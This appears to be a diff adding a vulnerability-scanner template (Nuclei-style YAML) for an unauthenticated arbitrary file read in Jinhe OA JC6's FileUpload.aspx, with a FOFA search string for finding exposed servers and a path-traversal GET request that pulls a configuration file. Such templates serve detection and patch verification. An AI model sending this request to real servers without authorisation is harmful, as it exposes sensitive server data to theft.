@@ -1,0 +1,27 @@
+id: jinheOA-JC6-FileUpload_aspx-File-reading
+
+info:
+  name: 金和OA JC6 FileUpload.aspx 任意文件读取漏洞
+  author: Superhero
+  severity: high
+  description: |-
+    fofa: app="金和网络-金和OA" || body="/jc6/platform/sys/login"
+    金和OA JC6 FileUpload.aspx 接囗处存在任意文件读取漏洞,未经身份验证的远程攻击者通过漏洞可以获取到服务器敏感信息，导致系统处于极不安全的状态。
+  reference:
+    - https://mp.weixin.qq.com/s/D-q6XwFc2Qrf_pqHPxd7hw
+  tags: File reading
+
+http:
+  - raw:
+      - |
+        GET /c6/jhsoft.wcf/functionnew/FileUpload.aspx?FileName=../../Resource/JHFileConfig.ini HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '[JHFile]'
+      - type: status
+        status: 
+          - 200
